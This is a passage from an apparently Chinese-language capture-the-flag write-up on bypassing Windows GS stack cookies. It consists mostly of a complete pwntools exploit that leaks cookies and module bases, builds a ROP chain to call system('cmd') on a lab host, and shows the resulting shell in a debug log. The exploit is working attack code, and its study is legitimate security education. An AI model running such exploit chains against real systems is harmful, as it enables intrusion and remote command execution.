    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
    #r = remote('10.211.55.3', 1234)
    r = remote('192.168.10.102', 1234)
    #pause()
    p1 = b'a' * 0x100
    r.sendafter('input:', p1)
    r.recvuntil('a' * 0x100)
    StackCookie = u64(r.recv(6).ljust(8, b'\x00'))
    li('StackCookie = ' + hex(StackCookie))
    p2 = b'a' * 0x118
    r.sendafter('input:' ,p2)
    r.recvuntil('a' * 0x118)
    leak_addr = u64(r.recv(6).ljust(8, b'\x00'))
    li('leak_addr = ' + hex(leak_addr))
    binary_base = leak_addr - 0x12F4
    li('binary_base = ' + hex(binary_base))
    main_addr = 0x1000 + binary_base
    p3 = b'a' * 0x100
    p3 += p64(StackCookie)
    p3 += b'a' * 0x10
    p3 += p64(main_addr)
    r.sendafter('input:', p3)
    r.sendafter('input:', p1)
    r.recvuntil('a' * 0x100)
    StackCookie = u64(r.recv(6).ljust(8, b'\x00'))
    li('StackCookie = ' + hex(StackCookie))
    p4 = b'a' * 0x180
    r.sendafter('input:', p4)
    r.recvuntil('a' * 0x180)
    ntdll_addr = u64(r.recv(6).ljust(8, b'\x00'))
    li('ntdll_addr = ' + hex(ntdll_addr))
    ntdll_base = ntdll_addr - 0x485b
    li('ntdll_base = ' + hex(ntdll_base))
    pop_rcx_ret = 0x0000000000096065 + ntdll_base
    pop_rbx_ret = 0x00000000000012a7 + ntdll_base
    pop_rdx_ret = 0x00000000000f12ab + ntdll_base
    puts_plt = 0x10A6 + binary_base
    security_cookie_addr = 0x3008 + binary_base
    p5 = b'a' * 0x100
    p5 += p64(StackCookie)
    p5 += b'a' * 0x10
    p5 += p64(pop_rcx_ret)
    p5 += p64(security_cookie_addr)
    p5 += p64(pop_rbx_ret)
    p5 += p64(1)
    p5 += p64(puts_plt)
    r.sendafter('input:', p5)
    r.recvuntil('a' * 0x100)
    r.recvline()
    security_cookie = u64(r.recvn(6).ljust(8, b'\x00'))
    li('security_cookie = ' + hex(security_cookie))
    old_rsp = security_cookie ^ StackCookie
    li('old_rsp = ' + hex(old_rsp))
    new_rsp = old_rsp + 0x160
    li('new_rsp = ' + hex(new_rsp))
现在有了新的rsp，通过`security_cookie`异或出新的`StackCookie`即可正常rop，此时输出`ucrtbase`，然后算出system和cmd，值得注意的是再次rop，rsp还是会变的，算好偏移即可，最终exp如下
    from pwn import *
    context.log_level = 'debug'
    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
    #r = remote('10.211.55.3', 1234)
    r = remote('192.168.10.102', 1234)
    #pause()
    p1 = b'a' * 0x100
    r.sendafter('input:', p1)
    r.recvuntil('a' * 0x100)
    StackCookie = u64(r.recv(6).ljust(8, b'\x00'))
    li('StackCookie = ' + hex(StackCookie))
    p2 = b'a' * 0x118
    r.sendafter('input:' ,p2)
    r.recvuntil('a' * 0x118)
    leak_addr = u64(r.recv(6).ljust(8, b'\x00'))
    li('leak_addr = ' + hex(leak_addr))
    binary_base = leak_addr - 0x12F4
    li('binary_base = ' + hex(binary_base))
    main_addr = 0x1000 + binary_base
    p3 = b'a' * 0x100
    p3 += p64(StackCookie)
    p3 += b'a' * 0x10
    p3 += p64(main_addr)
    r.sendafter('input:', p3)
    r.sendafter('input:', p1)
    r.recvuntil('a' * 0x100)
    StackCookie = u64(r.recv(6).ljust(8, b'\x00'))
    li('StackCookie = ' + hex(StackCookie))
    p4 = b'a' * 0x180
    r.sendafter('input:', p4)
    r.recvuntil('a' * 0x180)
    ntdll_addr = u64(r.recv(6).ljust(8, b'\x00'))
    li('ntdll_addr = ' + hex(ntdll_addr))
    ntdll_base = ntdll_addr - 0x485b
    li('ntdll_base = ' + hex(ntdll_base))
    pop_rcx_ret = 0x0000000000096065 + ntdll_base
    pop_rbx_ret = 0x00000000000012a7 + ntdll_base
    pop_rdx_ret = 0x00000000000f12ab + ntdll_base
    puts_plt = 0x10A6 + binary_base
    security_cookie_addr = 0x3008 + binary_base
    p5 = b'a' * 0x100
    p5 += p64(StackCookie)
    p5 += b'a' * 0x10
    p5 += p64(pop_rcx_ret)
    p5 += p64(security_cookie_addr)
    p5 += p64(pop_rbx_ret)
    p5 += p64(1)
    p5 += p64(puts_plt)
    r.sendafter('input:', p5)
    r.recvuntil('a' * 0x100)
    r.recvline()
    security_cookie = u64(r.recvn(6).ljust(8, b'\x00'))
    li('security_cookie = ' + hex(security_cookie))
    old_rsp = security_cookie ^ StackCookie
    li('old_rsp = ' + hex(old_rsp))
    new_rsp = old_rsp + 0x160
    li('new_rsp = ' + hex(new_rsp))
    read_got = 0x2178 + binary_base
    p6 = b'a' * 0x100
    p6 += p64(new_rsp ^ security_cookie)
    p6 += b'a' * 0x10
    p6 += p64(pop_rcx_ret) + p64(read_got)
    p6 += p64(pop_rbx_ret) + p64(1)
    p6 += p64(puts_plt)
    r.sendafter('input:', p6)
    r.recvuntil('a' * 0x100)
    r.recvline()
    ucrt_base = u64(r.recvn(6).ljust(8, b'\x00')) - 0x7650
    li('ucrt_base = ' + hex(ucrt_base))
    system_addr = 0xBCB20 + ucrt_base
    cmd = 0xE0020 + ucrt_base
    p7 = b'a' * 0x100
    p7 += p64((new_rsp + 0x160) ^ security_cookie)
    p7 += b'a' * 0x10
    p7 += p64(pop_rcx_ret) + p64(cmd)
    p7 += p64(system_addr)
    r.sendafter('input:', p7)
    r.interactive()
看一下打通的
    [*] Switching to interactive mode
    [DEBUG] Received 0x6 bytes:
        b'buffer'
    buffer[DEBUG] Received 0x17d bytes:
        00000000  3a 0d 0a 61  61 61 61 61  61 61 61 61  61 61 61 61  │:··a│aaaa│aaaa│aaaa│
        00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
        *
        00000100  61 61 61 8a  d2 4f 29 c5  43 0d 0a 4d  69 63 72 6f  │aaa·│·O)·│C··M│icro│
        00000110  73 6f 66 74  20 57 69 6e  64 6f 77 73  20 5b b0 e6  │soft│ Win│dows│ [··│
        00000120  b1 be 20 31  30 2e 30 2e  32 32 30 30  30 2e 39 37  │·· 1│0.0.│2200│0.97│
        00000130  38 5d 0d 0a  28 63 29 20  4d 69 63 72  6f 73 6f 66  │8]··│(c) │Micr│osof│
        00000140  74 20 43 6f  72 70 6f 72  61 74 69 6f  6e a1 a3 b1  │t Co│rpor│atio│n···│
        00000150  a3 c1 f4 cb  f9 d3 d0 c8  a8 c0 fb a1  a3 0d 0a 0d  │····│····│····│····│
        00000160  0a 43 3a 5c  55 73 65 72  73 5c 4c 65  6e 6f 76 6f  │·C:\│User│s\Le│novo│
        00000170  5c 44 65 73  6b 74 6f 70  5c 70 77 6e  3e           │\Des│ktop│\pwn│>│
        0000017d
    :
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaO)C
    Microsoft Windows [汾 10.0.22000.978]
    (c) Microsoft CorporationȨ
    C:\Users\Lenovo\Desktop\pwn>
一次不通可以多打几次
## 总结
也是学到了如何绕过GS，因为pwntools的模块没有像libc.sym的这样的东西，所以在写exp的时候没有自动化的一个获取，后面笔者有时间的话会寻找一下有没有对应的解决方案
## Reference